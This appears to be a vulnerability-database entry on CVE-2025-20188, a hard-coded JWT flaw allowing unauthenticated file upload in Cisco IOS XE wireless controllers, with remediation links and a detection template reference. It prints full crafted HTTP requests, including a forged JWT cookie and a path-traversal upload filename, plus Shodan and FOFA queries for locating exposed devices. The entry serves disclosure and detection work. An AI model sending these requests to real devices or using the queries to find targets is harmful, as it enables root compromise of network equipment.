---
layout: post
cve_id: CVE-2025-20188
title: Cisco IOS XE WLC - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2025/CVE-2025-20188.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-20188.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch,DhiyaneshDK
severity: critical
impact: 'Unauthenticated attackers can exploit hard-coded JWT tokens to upload arbitrary
  files and execute commands with root privileges on Cisco IOS XE WLC devices, leading
  to complete device compromise and potential network-wide access.

  '
remediation: 'Apply the patch provided in Cisco Security Advisory cisco-sa-wlc-file-uplpd-rHZG9UfC.

  '
reference:
- https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-file-uplpd-rHZG9UfC
- https://horizon3.ai/attack-research/attack-blogs/cisco-ios-xe-wlc-arbitrary-file-upload-vulnerability-cve-2025-20188-analysis/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2025-20188
  cwe-id: CWE-798
  epss-score: 0.02185
  epss-percentile: 0.83916
metadata:
  verified: true
  max-request: 2
  fofa-query: '"IOS-Self-Signed-Certificate" && port="8443"'
  shodan-query: http.html_hash:1076109428 ssl.cert.issuer.cn:"IOS-Self-Signed-Certificate"
    port:8443
tags:
- cve
- cve2025
- cisco
- file-upload
- intrusive
- rce
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability in the Out-of-Band Access Point (AP) Image Download feature of Cisco IOS XE Software for Wireless LAN Controllers (WLCs) could allow an unauthenticated, remote attacker to upload arbitrary files to an affected system.This vulnerability is due to the presence of a hard-coded JSON Web Token (JWT) on an affected system.An attacker could exploit this vulnerability by sending crafted HTTPS requests to the AP image download interface. A successful exploit could allow the attacker to upload files, perform path traversal, and execute arbitrary commands with root privileges.


## üåê HTTP Request
```nohighlight
POST /ap_spec_rec/upload/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13 Safari/608.2.11
Connection: close
Content-Length: 244
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf
Cookie: jwt=38EcmwPirJwlHcrXae2yRywDUf9

--------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="file"; filename="../..wp-admin//uBpHmzAk.txt"
Content-Type: text/plain

38ecmwpirjwlhcrxae2yrywduf9
--------------------------NCpI6tN3BZW3fz1Y9t2bkf--
```

```nohighlight
POST /ap_spec_rec/upload/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Content-Length: 244
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjgzNzgzMzMsInJlcWlkIjoiY2RiX3Rva2VuX3JlcXVlc3RfaWQxIn0.uEf7VgGHR3ik6d43soSmw5BFn-1R6GXeahTLHSmmWQI

--------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="file"; filename="../../wp-admin/uBpHmzAk.txt"
Content-Type: text/plain

38ecmwpirjwlhcrxae2yrywduf9
--------------------------NCpI6tN3BZW3fz1Y9t2bkf--
```

```nohighlight
GET /uBpHmzAk.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

